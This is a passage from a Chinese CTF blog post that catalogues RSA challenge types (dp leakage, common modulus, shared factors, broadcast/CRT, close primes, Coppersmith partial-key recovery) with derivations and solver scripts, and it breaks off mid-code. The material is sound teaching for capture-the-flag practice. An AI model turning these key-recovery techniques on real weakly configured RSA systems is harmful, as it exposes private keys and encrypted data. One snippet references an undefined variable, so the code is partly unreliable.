    <link href="/2025/04/07/RSA%E9%A2%98%E5%9E%8B%E6%B1%87%E6%80%BB/"/>
    <url>/2025/04/07/RSA%E9%A2%98%E5%9E%8B%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>RSA是每个新手都要跨越的第一道坎，相信你也经常遇见奇奇怪怪的RSA题型，这里记录了我遇见的各种题型，难度不分先后，随时更新。</p><h2 id="dp泄露-dp-d-mod-p-1"><a href="#dp泄露-dp-d-mod-p-1" class="headerlink" title="dp泄露(dp&#x3D;d mod p-1)"></a>dp泄露(dp&#x3D;d mod p-1)</h2><p><strong>分析：</strong><br>$\because dp\equiv d \mod p-1$<br>$\therefore edp\equiv ed\mod p-1$<br>$\because ed \equiv 1 \mod (p-1)(q-1)$<br>$\therefore edp+k_1(p-1) &#x3D; 1+k_2(p-1)(q-1)$<br>$\therefore edp&#x3D;(p-1)[k_1+k_2(q-1)]+1$<br>$\because dp&lt;p-1$<br>$\therefore 令A&#x3D;k_1+k_2(q-1)，有e&gt;A$<br>$\therefore A\in (0,e)$<br>$\because 转换得p&#x3D;\frac{edp-1}{A}+1$<br>$\therefore 遍历A（此时A不等于0）\in(1,e)，找到能整除的A，进而计算出p$<br><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#已知量</span><br>dp= <br>n = <br>c = <br>e = <br><br>x = e*dp-<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>        p_us = x//i +<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p_us == <span class="hljs-number">0</span>:<br>            p = p_us<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#print(p)</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=inverse(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="明文爆破"><a href="#明文爆破" class="headerlink" title="明文爆破"></a>明文爆破</h2><p><strong>已知：</strong> $n,e,c_list(每个明文字符单独加密的结果)$<br><strong>分析：</strong> 使用<code>string.printable</code>来表示所有可打印字符，逐个加密每个字符来对照密文。<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment">#爆破</span><br><br>n = <br>c_list = <br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c_list)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">ord</span>(j), e, n) == c_list[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found char: <span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>            ans += j<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p><strong>介绍：</strong> 使用不同的<code>e（如e1，e2）</code>来加密同一段明文<code>m</code>，并且使用相同的模<code>n</code>。<br><strong>分析：</strong><br>此时已知两个不同的<code>e1,e2</code>，所以不需要再求<code>d</code>了，这里使用<strong>扩展欧几里得算法</strong>，求出$k_1e_1+k_2e_2 &#x3D; 1$（若此时e1，e2不互素，也一般有较小的公因数，开小次方即可）。<br>所以$c_1^{k_1}c_2^{k_2} \equiv m^{k_1e_1+k_2e_2} \equiv m \mod n$<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#共模攻击（m相同，n相同，e不同）</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>c1= <br>c2= <br>e1= <br>e2= <br>n= <br><br>_ , k1 , k2 = gmpy2.gcdext(e1,e2)<br>m = <span class="hljs-built_in">pow</span>(c1,k1,n)*<span class="hljs-built_in">pow</span>(c2,k2,n) % n<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="公共因子攻击"><a href="#公共因子攻击" class="headerlink" title="公共因子攻击"></a>公共因子攻击</h2><p>原本觉得太简单是不想放的，但是后来考虑到许多题都是使用了类似的思想，所以本题型的重点是学会利用 <strong>公因数</strong> 求解一系列问题。这里以最简单的RSA为例。<br><strong>问题：</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#已知n1,n2,e,c求m</span><br>n1 = p*q1<br>n2 = p*q2<br>e = <br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m,e,n1)<br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>可以看出$p$是$n_1,n_2$的公共因子，因此可以通过求两者的最大公因数来求$p$<br>$即p&#x3D;gcd(n_1,n_2)$<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#公共因子攻击</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#已知量</span><br>n1= <br>n2=<br>c = <br>e =<br><br>p=GCD(n1,n2)<br>q1=n1//p<br>phi=(p-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>d=inverse(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n1)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="低加密指数攻击（e很小）"><a href="#低加密指数攻击（e很小）" class="headerlink" title="低加密指数攻击（e很小）"></a>低加密指数攻击（e很小）</h2><h3 id="1-单组-（e，n，c）"><a href="#1-单组-（e，n，c）" class="headerlink" title="1.单组$（e，n，c）$"></a>1.单组$（e，n，c）$</h3><p><strong>分析：</strong> 不用多说，这种题一般只需要<strong>直接开方</strong>或者<strong>小范围爆破</strong></p><h3 id="2-多组-（e，n-i，c-i）-（也叫做广播攻击）"><a href="#2-多组-（e，n-i，c-i）-（也叫做广播攻击）" class="headerlink" title="2.多组$（e，n_i，c_i）$（也叫做广播攻击）"></a>2.多组$（e，n_i，c_i）$（也叫做广播攻击）</h3><p><strong>分析：</strong> </p><ul><li><strong>思路一：</strong> 可以先分析各个$n$之间是否有<strong>公共因子</strong>，如果有，可以使用上边的公共因子攻击。</li><li><strong>思路二：</strong> 使用<strong>中国剩余定理（CRT）</strong>，通过中国剩余定理，可以更加逼近正确的$n$。中国剩余定理求出来一组$(n，c)$，此时攻击方法便和单组的一样了。<br><strong>代码：</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#中国剩余定理</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>n_list=[...]<br>c_list=[...]<br>e = <br><br>n = <span class="hljs-number">1</span><br>n_list_2 = []<br>n_list_2_inv = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n_list:<br>    n *= i<br>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n_list:<br>    tmp = n // i<br>    tmp_inv = inverse(tmp,i)<br>    n_list_2.append(tmp)<br>    n_list_2_inv.append(tmp_inv)<br>  <br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c_list)):<br>    c += c_list[i]*n_list_2[i]*n_list_2_inv[i] % n<br>c = c % n<br><br>m = gmpy2.iroot(c,e)[<span class="hljs-number">0</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">for k in range(1000) #自定义爆破k的范围</span><br><span class="hljs-string">c = c + k*n</span><br><span class="hljs-string">t = gmpy2.iroot(c,e)</span><br><span class="hljs-string">if t[1]:</span><br><span class="hljs-string">m = t[0]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="p-q相近"><a href="#p-q相近" class="headerlink" title="p,q相近"></a>p,q相近</h2><p><strong>已知：</strong> $n,c$，且p，q是十分接近的素数，或者是相邻的素数<br><strong>解法：</strong></p><ul><li><strong>一、</strong> factordb、yafu直接分解n</li><li><strong>二、</strong> 先对n开平方得到大概值，再使用<code>gmpy2</code>中的<code>next_prime()</code>来获取<code>q</code>，此时<code>p=n//q</code><br><strong>代码：</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>n = ...<br>c = ...<br>e = <span class="hljs-number">65537</span><br><br>q = gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>q = gmpy2.next_prime(q)<br>p = n // q<br><span class="hljs-comment">#print(p*q)</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(ans)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Coppersmith攻击"><a href="#Coppersmith攻击" class="headerlink" title="Coppersmith攻击"></a>Coppersmith攻击</h2><p><strong>介绍：</strong> Coppersmith方法基于<strong>LLL算法</strong>求多项式<strong>小根</strong>，求“<strong>已知某些二进制位，求剩余位</strong>”问题，<br><strong>功能：</strong> 假如有一个$e$阶的多项式$f$，则有</p><ul><li>在模$n$下，可以用$O(\log n)$的算法求出$n^{\frac1e}$以内的根</li><li>给定$\beta$，快速求出模$b$下的小根（其中$b\geq n^\beta$，且$b$是$n$的因数）</li></ul><p> <strong>实现：</strong> 在$Sagemath$中使用<code>small_roots()</code>方法实现。</p><h3 id="P高位泄露，求低位"><a href="#P高位泄露，求低位" class="headerlink" title="P高位泄露，求低位"></a>P高位泄露，求低位</h3><p><strong>分析：</strong> 利用Coppersmith，此时$p&#x3D;pHigh+x$，则有$\frac 1e&#x3D;1$ ,<br>令$p\equiv 0 \mod b$ ，其中$n^\beta \leq b \leq n$ ,<br>若想$b&#x3D;p$，则需要$p\geq n^\beta$ ，由于RSA中$p,q$ 一般位数相近，都在$n^{0.5}$，所以一般取$\beta \in [0.1,0.4]$。</p><blockquote><p>据说$p$的泄露位数$\frac{pHigh.nbits()}{p.nbits()}$要大于<strong>0.56</strong>左右才能解出，对512bits的$p$来说需要288位已知，对1024bits的$p$来说要576位左右。</p></blockquote><p><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>n=<br>p_high=<br>pbits=<br>kbits=pbits-p_high.nbits()  <span class="hljs-comment">#小根位数</span><br><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>p_high &lt;&lt;= kbits<br>p = p_high + x <br>roots = p.small_roots(X=<span class="hljs-number">2</span>^kbits,beta=<span class="hljs-number">0.4</span>)<br><br>p = p_high + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br>q = n // p<br></code></pre></td></tr></table></figure><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>（鹤城杯 2021 babyrsa）<br><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br>hint1 = p &gt;&gt; <span class="hljs-number">724</span><br>hint2 = q % (<span class="hljs-number">2</span> ** <span class="hljs-number">265</span>)<br>ct = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br><span class="hljs-built_in">print</span>(hint1)<br><span class="hljs-built_in">print</span>(hint2)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(ct)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br><span class="hljs-string">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br><span class="hljs-string">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br><span class="hljs-string">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>已知p的高1024-724 &#x3D; 300位，以及q的低265位。已知的p的高300位远小于576位，因此不能直接用coppersmith定理，需要找到更多的已知位数。<br>由$n &#x3D; pq$得，$n\equiv p_lq_l\mod 2^{265}$<br>所以得，$p_l \equiv nq_l^{-1} \mod 2^{265}$<br>求出了p的低265位，此时已知265+300 &#x3D; 565，很接近576位，但是还是有些距离，进行几位爆破。<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br>p_high = <span class="hljs-number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br>q_low = <span class="hljs-number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br>c = <span class="hljs-number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br>e = <span class="hljs-number">65537</span><br>mod_num = <span class="hljs-number">2</span>^<span class="hljs-number">265</span><br><br>p_low = inverse(q_low,mod_num)*n % mod_num<br><br>pbits = <span class="hljs-number">1024</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>^<span class="hljs-number">6</span>):<br><span class="hljs-comment">#这里对p_high往低几位进行爆破，当然也可以对p_low往高几位进行爆破，注意kbits的变化即可。</span><br>    p_high1 = p_high &lt;&lt; <span class="hljs-number">6</span><br>    p_high1 = p_high1 + i<br>    kbits = pbits - p_high1.nbits()<br>    p_high1 &lt;&lt;= kbits<br>    p_bar = p_high1 + p_low<br>    kbits = kbits - p_low.nbits()<br><br>    p = p_bar + x*mod_num  <span class="hljs-comment">#因为低位以及知道，x是中间的数，因此向左移265位</span><br>    p = p.monic()          <span class="hljs-comment">#转换成首一多项式，small_roots只能处理首一多项式</span><br>    <span class="hljs-built_in">print</span>(i)<br>    roots = p.small_roots(X = <span class="hljs-number">2</span>^kbits,beta = <span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> roots:<br>        p = p_bar + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])*mod_num<br>        <span class="hljs-built_in">print</span>(p)<br>        <span class="hljs-keyword">if</span> n%p == <span class="hljs-number">0</span>:<br>            q = n // p<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            m = <span class="hljs-built_in">pow</span>(c,d,n)<br>            ans = long_to_bytes(m)<br>            <span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h3 id="m高位泄露，求低位"><a href="#m高位泄露，求低位" class="headerlink" title="m高位泄露，求低位"></a>m高位泄露，求低位</h3><p><strong>分析：</strong> 利用coppersmith方法，可以构造$(m_{high}+x)^e-c\equiv 0 \mod n$ ，此时有$b \geq n^{\beta}$ ，因此取$\beta &#x3D; 1$ 。<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>c = <br>e = <br>m_high =<br>mbits =<br><br>kbits = mbits - m_high.nbits()<br>m_high &lt;&lt;= kbits<br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (m_high + x)^e - c<br>f=f.monic()<br>roots = f.small_roots(X = <span class="hljs-number">2</span> ^ kbits,beta = <span class="hljs-number">1</span>)<br>m = m_high + roots[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h3 id="dp高位泄露"><a href="#dp高位泄露" class="headerlink" title="dp高位泄露"></a>dp高位泄露</h3><p><strong>已知：</strong> $d_{ph},e,n,c$，求$dp$，从而求明文<br><strong>分析：</strong><br>这里分情况讨论，分别记为 <strong>$e$较大的情况</strong> 和 <strong>$e$较小的情况</strong>。</p><ul><li><strong>1.$e$较大</strong>：使用二元coppersmith求解，可以求出$d_p$，之后就利用费马小定理，得到$a^{e\cdot d_p}\equiv a\mod p$，所以$p&#x3D;gcd(a^{e\cdot d_p}-a,n)$</li><li><strong>2.$e$较小：</strong> 因为$e\cdot d_p\equiv 1\mod (p-1)$，所以有$ed_p&#x3D;k(p-1)+1$，即$ed_p+k-1\equiv 0\mod p(由d_p&lt;p-1可得k\in(1,e))$。令$tmp &#x3D; e^{-1}\mod n$，则$tmp\cdot ed_p+tmp(k-1)\equiv 0\mod p$，即$d_p+tmp(k-1)\equiv 0 \mod n$。对$k$进行爆破，利用coppersmith定理求$d_p$低位<br><strong>代码：</strong><br>1.$e$较大：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br>        <span class="hljs-built_in">print</span>(d)<br>    R = f.base_ring()<br>    N = R.cardinality()<br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br>    B, monomials = G.coefficient_matrix()<br>    monomials = vector(monomials)<br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br>    B = B.dense_matrix().LLL()<br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br>    <span class="hljs-keyword">return</span> []<br><br>n = <br>c = <br>e = <br><span class="hljs-comment">#hint=dp &gt;&gt; kbits</span><br>hint = <br>kbits = <br>leak = hint &lt;&lt; kbits<br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f = e * (leak + x) + (y - <span class="hljs-number">1</span>)<br>res = small_roots(f,(<span class="hljs-number">2</span>^kbits,<span class="hljs-number">2</span>^kbits),m=<span class="hljs-number">1</span>,d=<span class="hljs-number">4</span>)   <span class="hljs-comment">#求不出时调整m，d的参数值</span><br><span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-built_in">print</span>(root)<br>    dp_low = root[<span class="hljs-number">0</span>]<br>    dp = leak + dp_low<br>    tmp = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,e*dp,n) - <span class="hljs-number">2</span><br>    p = gmpy2.gcd(tmp,n)<br>    q = n // p<br>    d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>2.$e$较小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 